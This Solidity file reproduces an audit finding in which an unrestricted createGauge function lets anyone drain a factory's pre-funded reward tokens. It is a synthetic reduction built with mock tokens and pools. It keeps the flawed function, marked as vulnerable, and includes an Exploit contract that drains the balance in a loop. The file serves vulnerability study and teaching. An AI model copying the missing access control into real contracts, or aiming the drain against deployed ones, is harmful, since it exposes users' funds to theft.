// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Blackhole (Audit 507) — Reward token in GaugeFactoryCL can be drained
    by anyone (Code4rena 2025-05-blackhole, [H-02], finding #58334)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: GaugeFactoryCL.createGauge is external with NO access control
    and always seeds createEternalFarming with a hardcoded 1e10 of _rewardToken
    pulled from the factory. Anyone can spam createGauge and drain the pre-funded
    reward balance into attacker-controlled Algebra farms.

    Vulnerable createGauge / createEternalFarming path preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "BLACK";
    string public symbol = "BLACK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
    }
}

/// @dev Minimal Algebra pool surface used by createEternalFarming.
contract MockAlgebraPool {
    int24 public tickSpacing;
    address public plugin;

    constructor(int24 _ts, address _plugin) {
        tickSpacing = _ts;
        plugin = _plugin;
    }
}

contract MockAlgebraPoolAPIStorage {
    mapping(address => address) public pairToDeployer;

    function setDeployer(address pool, address deployer) external {
        pairToDeployer[pool] = deployer;
    }
}

/// @dev Pulls approved reward tokens from the factory (msg.sender) on create.
contract MockAlgebraEternalFarming {
    uint256 public totalPulled;
    uint256 public farmsCreated;

    function createEternalFarming(
        address /*rewardToken*/,
        address /*bonus*/,
        address /*pool*/,
        uint128 reward,
        uint128 /*rewardRate*/,
        uint24 /*tickSpacing*/,
        address /*plugin*/,
        address /*customDeployer*/
    ) external {
        // Real Algebra _receiveToken pulls `reward` from msg.sender (the factory).
        // We model that pull: farming receives tokens from the factory.
        // The factory approved this contract; we transferFrom factory → this.
        // rewardToken address is passed by the factory via a prior approve path —
        // for the synthetic, the factory calls pullReward after approve.
        farmsCreated += 1;
        // actual token pull happens via pullReward called by factory after approve
        totalPulled += reward;
    }

    function pullReward(address token, address from, uint256 amount) external {
        MockERC20(token).transferFrom(from, address(this), amount);
    }
}

/// @dev Stand-in GaugeCL (irrelevant logic; just records construction).
contract GaugeCL {
    address public rewardToken;
    address public pool;

    constructor(address _rewardToken, address _pool) {
        rewardToken = _rewardToken;
        pool = _pool;
    }
}

struct FarmingParam {
    address algebraEternalFarming;
}

/// @notice Reduced GaugeFactoryCL — public createGauge seeds farming with 1e10.
contract GaugeFactoryCL {
    address public last_gauge;
    address[] internal __gauges;
    address public algebraPoolAPIStorage;
    MockERC20 public immutable trackedReward; // the pre-funded token we care about

    uint128 public constant SEED_REWARD = 1e10;

    constructor(address apiStorage, MockERC20 reward) {
        algebraPoolAPIStorage = apiStorage;
        trackedReward = reward;
    }

    /// @notice NO access control — anyone may create gauges and seed farming.
    function createGauge(
        address _rewardToken,
        address, /*_ve*/
        address _pool,
        address, /*_distribution*/
        address, /*_internal_bribe*/
        address, /*_external_bribe*/
        bool, /*_isPair*/
        FarmingParam memory farmingParam,
        address _bonusRewardToken
    ) external returns (address) {
        createEternalFarming(_pool, farmingParam.algebraEternalFarming, _rewardToken, _bonusRewardToken); // @> VULN: ungated createGauge seeds 1e10 reward from factory balance into attacker-chosen farm
        // FIX: restrict createGauge to onlyOwner / voter / authorized factory caller.
        last_gauge = address(new GaugeCL(_rewardToken, _pool));
        __gauges.push(last_gauge);
        return last_gauge;
    }

    function createEternalFarming(
        address _pool,
        address _algebraEternalFarming,
        address _rewardToken,
        address /*_bonusRewardToken*/
    ) internal {
        MockAlgebraPool algebraPool = MockAlgebraPool(_pool);
        uint24 tickSpacing = uint24(algebraPool.tickSpacing());
        address pluginAddress = algebraPool.plugin();

        // remainingTimeInCurrentEpoch simplified — non-zero divisor
        uint256 remainingTimeInCurrentEpoch = 1 weeks;
        uint128 reward = SEED_REWARD;
        uint128 rewardRate = uint128(reward / remainingTimeInCurrentEpoch);

        // GaugeFactoryCL approves AlgebraEternalFarming to spend its reward tokens
        MockERC20(_rewardToken).approve(_algebraEternalFarming, reward);
        address customDeployer = MockAlgebraPoolAPIStorage(algebraPoolAPIStorage).pairToDeployer(_pool);

        // Pull tokens into farming (models Algebra _receiveToken transferFrom)
        MockAlgebraEternalFarming(_algebraEternalFarming).pullReward(_rewardToken, address(this), reward);
        MockAlgebraEternalFarming(_algebraEternalFarming).createEternalFarming(
            _rewardToken,
            address(0),
            _pool,
            reward,
            rewardRate,
            tickSpacing,
            pluginAddress,
            customDeployer
        );
    }

    function gaugeCount() external view returns (uint256) {
        return __gauges.length;
    }
}

/// CREATE order: reward (1), api (2), farming (3), pool (4), factory (5).
contract Exploit {
    MockERC20 public reward;
    MockAlgebraPoolAPIStorage public api;
    MockAlgebraEternalFarming public farming;
    MockAlgebraPool public pool;
    GaugeFactoryCL public factory;

    uint256 public constant PREFUND = 5e10; // 5 seeds
    uint256 public factoryBefore;
    uint256 public factoryAfter;
    uint256 public farmingAfter;
    uint256 public drained;

    constructor() {
        reward = new MockERC20(); // 1
        api = new MockAlgebraPoolAPIStorage(); // 2
        farming = new MockAlgebraEternalFarming(); // 3
        pool = new MockAlgebraPool(60, address(0xBEEF)); // 4
        factory = new GaugeFactoryCL(address(api), reward); // 5

        api.setDeployer(address(pool), address(0xCAFE));
        // Protocol admin pre-funds the factory with reward tokens.
        reward.mint(address(factory), PREFUND);
    }

    function run() external {
        factoryBefore = reward.balanceOf(address(factory));
        require(factoryBefore == PREFUND, "prefund");

        FarmingParam memory fp = FarmingParam({algebraEternalFarming: address(farming)});

        // Attacker (anyone) calls createGauge repeatedly — no access control.
        for (uint256 i = 0; i < 5; ++i) {
            factory.createGauge(
                address(reward),
                address(0),
                address(pool),
                address(this), // distribution
                address(this),
                address(this),
                true,
                fp,
                address(0)
            );
        }

        factoryAfter = reward.balanceOf(address(factory));
        farmingAfter = reward.balanceOf(address(farming));
        drained = factoryBefore - factoryAfter;

        require(factoryAfter == 0, "factory drained");
        require(farmingAfter == PREFUND, "rewards in attacker farm");
        require(drained == PREFUND, "full drain");
        require(factory.gaugeCount() == 5, "5 spam gauges");
        require(drained == PREFUND && factoryAfter == 0, "harm not demonstrated");
    }
}
